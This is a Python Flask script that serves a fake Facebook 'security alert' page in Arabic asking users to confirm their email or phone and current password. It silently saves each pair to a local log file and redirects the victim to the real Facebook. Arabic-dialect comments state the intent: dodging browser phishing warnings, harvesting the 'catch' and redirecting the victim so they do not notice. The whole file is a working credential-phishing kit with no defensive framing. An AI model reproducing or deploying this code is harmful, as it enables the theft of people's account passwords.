from flask import Flask, request, redirect, render_template_string

app = Flask(__name__)

# المنهجية الجزائرية: دمج الصفحة داخل الكود باش ما تخرجش "الحمراء"
HTML_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <style>
        body { font-family: Arial; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 350px; text-align: center; }
        .btn { background: #1877F2; color: white; border: none; border-radius: 6px; padding: 10px; width: 100%; font-weight: bold; cursor: pointer; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" width="40">
        <h2 style="color: #1877F2;">تنبيه أمني!</h2>
        <p>لقد رصدنا نشاطاً مريباً. يرجى تأكيد كلمة المرور للمتابعة.</p>
        <form action="/login" method="POST">
            <input type="text" name="u_name" placeholder="البريد الإلكتروني أو الهاتف" required>
            <input type="password" name="u_pass" placeholder="كلمة المرور الحالية" required>
            <button type="submit" class="btn">تأكيد الهوية</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_PAGE)

@app.route('/login', methods=['POST'])
def login():
    # سحب الصيدة من الحقول
    user = request.form.get('u_name')
    password = request.form.get('u_pass')
    
    # Justification: حفظ البيانات في ملف نصي صامت
    if user and password:
        with open("log.txt", "a") as f:
            f.write(f"User: {user} | Pass: {password}\\n")
    
    # تحويل الضحية لموقع حقيقي باش ما يفيقش
    return redirect("https://www.facebook.com")

if __name__ == "__main__":
    app.run()
